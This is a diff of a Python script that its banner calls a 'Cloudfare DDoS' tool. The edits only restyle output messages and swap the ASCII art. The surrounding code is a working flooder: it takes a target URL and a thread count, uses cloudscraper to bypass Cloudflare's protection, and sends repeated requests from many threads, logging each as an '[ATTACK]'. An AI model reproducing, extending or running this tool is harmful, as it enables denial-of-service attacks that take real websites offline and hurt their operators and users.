@@ -4,7 +4,7 @@ import requests
 import threading
 from time import sleep
 ###################################################################
-print(" ")                                                        
+print(" ")                                                        #
 print("Otomatik Kurulum Yapılıyor Hiçbir Tuşa Basmayınız . . .")  #
 os.system("pip3 install cloudscraper")                            #
 os.system("pip3 install requests")                                #
@@ -16,16 +16,16 @@ def check_url(url):
         cloudfare_check_url = requests.Session()
         response = cloudfare_check_url.get(url)
         if response.status_code == 200:
-            print("[INFO] The url is valid")
+            print("[INFO] The Url İs Valid")
         elif response.status_code == 404:
-            print("[INFO] The url is invalid")
+            print("[INFO] The Url İs İnvalid")
     except:
         bypass = cloudscraper.create_scraper()
         response2 = bypass.get(url)
         if response2.status_code == 200:
-            print("[INFO]The url is valid")
+            print("[INFO] The Url İs Valid")
         elif response2.status_code == 404:
-            print("[INFO] The url is invalid")
+            print("[INFO] The Url İs İnvalid")
 
 count = 0
 
@@ -41,10 +41,10 @@ def bypass(url, threads):
             response = r.get(url)
             count +=1
 
-            print("\n" + f"[ATTACK] Status code: {response.status_code} Request number: {count}" + "\n")
+            print("\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n")
 
             response = bypass2.get(url)
-            print("\n" + f"[ATTACK]Status code: {response.status_code} Request number: {count}" + "\n")
+            print("\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n")
 
     list_of_threads = []
 
@@ -64,20 +64,18 @@ def bypass(url, threads):
 
 print(
     """
-    
-      ____ _                 _  __                  ____  ____       ____  
-     / ___| | ___  _   _  __| |/ _| __ _ _ __ ___  |  _ \|  _ \  ___/ ___|   ~>Cloudfare DDoS<~ 
-    | |   | |/ _ \| | | |/ _` | |_ / _` | '__/ _ \ | | | | | | |/ _ \___ \  ~~>Made by tfwcodes(github)<~~
-    | |___| | (_) | |_| | (_| |  _| (_| | | |  __/ | |_| | |_| | (_) |__) |
-     \____|_|\___/ \__,_|\__,_|_|  \__,_|_|  \___| |____/|____/ \___/____/ 
-    
-    
+   ________                __________                ____  ____       _____
+  / ____/ /___  __  ______/ / ____/ /___ _________  / __ \/ __ \____ / ___/
+ / /   / / __ \/ / / / __  / /_  / / __ `/ ___/ _ \/ / / / / / / __ \\__ \ 
+/ /___/ / /_/ / /_/ / /_/ / __/ / / /_/ / /  /  __/ /_/ / /_/ / /_/ /__/ / 
+\____/_/\____/\__,_/\__,_/_/   /_/\__,_/_/   \___/_____/_____/\____/____/  
+                                                                           
     """
 )
 
-url = input("[INFO] Enter the target url: ")
+url = input("[INFO] Enter The Target Url : ")
 check_url(url)
 sleep(1)
 
-threads = input("[INFO] Enter the number of threads: ")
+threads = input("[INFO] Enter The Number Of Threads : ")
 bypass(url, threads)
